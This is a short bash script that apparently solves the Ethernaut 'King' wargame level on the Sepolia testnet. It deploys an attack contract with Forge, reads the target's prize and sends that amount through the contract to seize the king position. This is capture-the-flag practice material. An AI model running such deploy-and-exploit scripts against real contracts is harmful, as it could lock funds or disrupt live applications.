#!/bin/bash

# Navigate up two directories
cd ..
cd ..
cd ..

# Load environment variables from .env file
source .env

# Prompt for the TARGET value
read -p "Enter the TARGET value: " TARGET

# Create the contract using Forge and capture the output
DEPLOY_OUTPUT=$(forge create --rpc-url "$SEPOLIA_RPC_URL" --private-key "$PRIVATE_KEY" src/King/solution/Attack.sol:ClaimKing)

# Extract the deployment address from the output
CURRENT=$(echo "$DEPLOY_OUTPUT" | grep "Deployed to" | awk '{print $NF}')

# Print the deployment address
echo "Contract deployed to address: $CURRENT"

# Function to get current prize
get_prize() {
    cast call "$TARGET" "prize()" --rpc-url "$SEPOLIA_RPC_URL"
}

# Get the prize in wei (hexadecimal), convert to decimal, and then to ETH
PRIZE_WEI_HEX=$(get_prize)
PRIZE_WEI_DEC=$(printf "%d\n" "$PRIZE_WEI_HEX")
PRIZE=$(echo "scale=5; $PRIZE_WEI_DEC / 1000000000000000000" | bc | awk '{printf "0%s\n", $0}')

# Interact with the deployed contract
if ! cast send "$CURRENT" "sendMoney(address)" "$TARGET" --private-key "$PRIVATE_KEY" --rpc-url "$SEPOLIA_RPC_URL" --value "$PRIZE"ether; then
    echo "Error sending transaction. Check contract function and arguments."
fi